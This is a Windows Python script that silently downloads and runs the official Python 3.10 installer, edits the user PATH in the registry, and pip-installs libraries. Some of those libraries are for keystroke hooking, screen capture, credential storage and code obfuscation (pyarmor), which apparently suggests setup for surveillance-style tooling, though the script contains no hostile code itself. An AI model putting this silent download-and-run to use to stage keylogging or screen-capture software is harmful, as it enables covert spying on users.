import subprocess
import sys
import os
import winreg

def is_python_installed():
    python_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Programs', 'Python', 'Python310')
    return os.path.exists(python_dir)

def add_to_path(path_to_add):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_ALL_ACCESS)
        current_path_value, _ = winreg.QueryValueEx(key, 'Path')
        
        if path_to_add not in current_path_value.split(os.pathsep):
            new_path_value = current_path_value + os.pathsep + path_to_add
            
            winreg.SetValueEx(key, 'Path', 0, winreg.REG_EXPAND_SZ, new_path_value)
            print("Added '{}' to the Path environment variable.".format(path_to_add))
        else:
            print("Path '{}' is already in the Path environment variable.".format(path_to_add))
        
        winreg.CloseKey(key)
    except Exception as e:
        print("An error occurred while modifying the Path environment variable:", e)

def install_python():
    if not is_python_installed():
        install_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Programs', 'Python', 'Python310')
        
        python_installer_url = "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe"
        
        python_installer_path = os.path.join(os.getenv('TEMP'), 'python-3.10.0-amd64.exe')
        subprocess.run(['curl', '-o', python_installer_path, python_installer_url], shell=True, check=True)
        
        subprocess.run([python_installer_path, '/quiet', 'InstallAllUsers=1', 'DefaultAllUsersTargetDir=' + install_dir], shell=True, check=True)
    
    scripts_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Programs', 'Python', 'Python310', 'Scripts')
    
    print("Path of the 'Scripts' directory:", scripts_path)
    
    add_to_path(scripts_path)
    
    # Install additional libraries
    subprocess.run([os.path.join(scripts_path, 'pip'), 'install', 'mysql-connector-python', 'cryptography', 'keyboard', 'requests', 'art', 'keyring', 'opencv-python', 'mss', 'pywin32', 'pyautogui', 'pyarmor', 'dxcam'], check=True)

if __name__ == "__main__":
    install_python()
